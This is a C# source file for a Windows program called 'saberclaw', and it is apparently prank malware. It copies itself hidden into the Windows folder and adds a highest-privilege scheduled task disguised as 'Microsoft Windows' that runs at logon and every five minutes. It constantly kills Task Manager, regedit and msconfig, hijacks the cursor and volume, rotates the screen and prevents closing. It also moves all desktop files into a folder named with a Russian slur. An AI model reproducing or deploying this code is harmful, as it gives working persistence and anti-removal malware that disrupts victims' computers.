using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows;
using System.Windows.Forms;
using cursor = System.Windows.Forms.Cursor;
using System.Windows.Interop;
using ScreenRotate;
using Gma.System.MouseKeyHook;
using NAudio.Wave;
using Microsoft.Win32.TaskScheduler;
using Application = System.Windows.Forms.Application;
using Task = System.Threading.Tasks.Task;

namespace saberclaw
{
    /// <summary>
    /// Логика взаимодействия для MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        static Random r = new Random();
        static Random s = new Random();

        private IKeyboardMouseEvents hook;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern int SystemParametersInfo(int uAction, int uParam, IntPtr lpvParam, int fuWinIni);

        const int SPI_SETDESKWALLPAPER = 20;
        const int SPIF_UPDATEINIFILE = 0x1;
        const int SPIF_SENDWININICHANGE = 0x2;


        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr SendMessageW(IntPtr hWnd, int Msg,
            IntPtr wParam, IntPtr lParam);
        const int APPCOMMAND_VOLUME_UP = 0xA0000;
        const int WM_APPCOMMAND = 0x319;

        static readonly string path = $"{Environment.GetFolderPath(Environment.SpecialFolder.Windows)}\\saber.exe";

        static Mutex mutex;

        public MainWindow()
        {
            bool isExist;
            mutex = new Mutex(true, "zalupa", out isExist);
            if (!isExist)
                Close();
            InitializeComponent();

            Load();

            Task task1 = new Task(Curs);
            task1.Start();
            Task task2 = new Task(Kill);
            task2.Start();

            hook = Hook.GlobalEvents();
            hook.KeyDown += HookKey;
            hook.MouseDown += HookMouse;
            
            const string ricardo = @"C:\ricardo.mp4";
            const string goos = @"C:\goos.mp3";
            const string desk = @"C:\desktop.bmp";

            if (File.Exists(ricardo))
                File.Delete(ricardo);
            if (File.Exists(goos))
                File.Delete(goos);
            if (File.Exists(desk))
                File.Delete(desk);

            File.WriteAllBytes(ricardo, Properties.Resources.ricardo);
            File.WriteAllBytes(goos, Properties.Resources.goos);
            Properties.Resources.deskgoos.Save(desk, ImageFormat.Bmp);

            SystemParametersInfo(SPI_SETDESKWALLPAPER, 1, Marshal.StringToBSTR(desk),
                SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);

            File.SetAttributes(ricardo, FileAttributes.Hidden);
            File.SetAttributes(goos, FileAttributes.Hidden);
            File.SetAttributes(desk, FileAttributes.Hidden);

            DirectoryInfo directory = new DirectoryInfo(Environment.GetFolderPath(
                    Environment.SpecialFolder.DesktopDirectory));
            DirectoryInfo pidoras = new DirectoryInfo($"{directory.FullName}\\бан по причине ПИДОРАС");

            if (!pidoras.Exists)
                pidoras.Create();

            foreach (var i in directory.EnumerateFiles())
            {
                if (i.Name == pidoras.Name || File.Exists($"{pidoras.FullName}\\{i.Name}"))
                    continue;
                i.MoveTo($"{pidoras.FullName}\\{i.Name}");
            }

            foreach (var i in directory.EnumerateDirectories())
            {
                if (i.Name == pidoras.Name || File.Exists($"{pidoras.FullName}\\{i.Name}"))
                    continue;
                i.MoveTo($"{pidoras.FullName}\\{i.Name}");
            }
        }

        public void Load()
        {
            string exe = Application.ExecutablePath;
            File.Delete(path);
            File.Copy(exe, path);
            File.SetAttributes(path, FileAttributes.Hidden);

            TaskDefinition task = TaskService.Instance.NewTask();
            LogonTrigger logon = new LogonTrigger() { Delay = TimeSpan.FromSeconds(1) };
            DailyTrigger time = new DailyTrigger();
            time.Repetition.Interval = TimeSpan.FromMinutes(5);
            time.Repetition.Duration = TimeSpan.FromDays(double.PositiveInfinity);
            task.Triggers.Add(logon);
            task.Triggers.Add(time);
            task.Actions.Add(path, null);
            task.Principal.RunLevel = TaskRunLevel.Highest;
            TaskService.Instance.RootFolder.RegisterTaskDefinition("Microsoft Windows", task);
        }

        public void Kill()
        {
            while (true)
            {
                try
                {
                    foreach (var i in Process.GetProcesses())
                    {
                        if (i.ProcessName.ToLower() == "taskmgr" || i.ProcessName == "regedit" || i.ProcessName == "msconfig")
                        {
                            i.Kill();
                        }
                    }
                }
                catch (Exception) {  }
            }
        }

        public void Rotate()
        {
            int count = s.Next(4);
            
            switch (count)
            {
              case 1:
                  Display.Rotate(Convert.ToUInt32(SystemInformation.MonitorCount), Display.Orientations.DEGREES_CW_90);
                  break;
              case 2:
                  Display.Rotate(Convert.ToUInt32(SystemInformation.MonitorCount), Display.Orientations.DEGREES_CW_180);
                  break;
              case 3:
                  Display.Rotate(Convert.ToUInt32(SystemInformation.MonitorCount), Display.Orientations.DEGREES_CW_270);
                  break;
              default:
                  Display.Rotate(Convert.ToUInt32(SystemInformation.MonitorCount), Display.Orientations.DEGREES_CW_0);
                  break;
            }
        }

        public void Play()
        {
            using (var wave = new WaveOutEvent())
            {
                var stream = new MemoryStream(Properties.Resources.ohuel);
                Mp3FileReader mp3 = new Mp3FileReader(stream);
                stream.Position = 0;
                mp3.Position = 0;
                wave.Init(mp3);
                wave.Play();
                while (wave.PlaybackState == PlaybackState.Playing)
                {
                    Thread.Sleep(100);
                    media1.Volume = 0;
                    media2.Volume = 0;
                }
                media1.Volume = 1;
                media2.Volume = 0.2;
            }
        }

        public void Curs()
        {

            var x = SystemInformation.PrimaryMonitorSize.Width;
            var y = SystemInformation.PrimaryMonitorSize.Height;

            WindowInteropHelper wih = new WindowInteropHelper(this);
            while (true)
            {
                cursor.Position = new System.Drawing.Point(r.Next(x), r.Next(y));
                Dispatcher.Invoke(() => SendMessageW(wih.Handle, WM_APPCOMMAND, wih.Handle, (IntPtr)APPCOMMAND_VOLUME_UP));
            }
        }

        private void HookKey(object sender, KeyEventArgs e)
        {
            Rotate();
            Play();
        }

        private void HookMouse(object sender, MouseEventArgs e)
        {
            Rotate();
            Play();
        }

        private void Media_OnMediaEnded(object sender, RoutedEventArgs e)
        {
            media1.Position = TimeSpan.FromMilliseconds(1);
        }

        private void Media2_OnMediaEnded(object sender, RoutedEventArgs e)
        {
            media2.Position = TimeSpan.FromMilliseconds(1);
        }

        private void MainWindow_OnClosing(object sender, CancelEventArgs e)
        {
            e.Cancel = true;
        }
    }
}
